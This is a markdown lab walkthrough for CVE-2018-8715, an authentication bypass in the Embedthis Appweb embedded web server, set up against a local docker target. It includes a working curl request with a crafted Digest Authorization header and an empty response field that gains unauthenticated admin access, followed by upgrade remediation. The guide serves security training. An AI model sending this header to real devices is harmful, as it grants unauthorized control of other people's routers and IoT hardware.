# Embedthis Appweb HTTP Authentication Bypass (CVE-2018-8715)

## Overview

Embedthis Appweb is a fast, lightweight embedded web server designed for embedded devices, routers, and IoT hardware. In Appweb versions before 7.0.3, the Digest authentication verification routine contains logic flaws when processing the Authorization header. If an attacker submits an empty session or password hash alongside specific Digest fields, the authentication check succeeds, granting unauthenticated administrative access.

- **Service Access**: `http://localhost:8159/`
- **Default Credentials**: `Unauthenticated Digest bypass`
- **Docker Shortcut**: `./lab start appweb-auth-bypass`
- **Container Name**: `cyberlab_02_appweb_auth_bypass`
- **RAM Footprint**: ~50M

---

## Exploitation Walkthrough

### 1. Attempt Unauthenticated Access to Admin Page

```bash
curl -i http://localhost:8159/
```

### 2. Bypass Authentication via Crafted Authorization Header

```bash
curl -i -H 'Authorization: Digest username="admin", realm="example.com", nonce="test", uri="/", response="", qop=auth, nc=00000001, cnonce="test"' http://localhost:8159/
```

### 3. Verify HTTP 200 OK Response

```bash
# Server returns HTTP/1.1 200 OK and exposes protected administrative contents.
```

---

## Defensive Remediation & Hardening

1. Upgrade Appweb to version 7.0.3 or higher.
2. Verify all embedded firmware builds linking Appweb are updated.

---

## Video Walkthroughs & Technical References

- [[A1] Hijacking a Session - WebGoat](https://www.youtube.com/watch?v=YO8rsCMVUyY)
- [Appweb CVE-2018-8715 Advisory](https://github.com/embedthis/appweb/issues/610)
- [Vulhub Appweb Environment](https://vulhub.org/#/environments/appweb/CVE-2018-8715/)
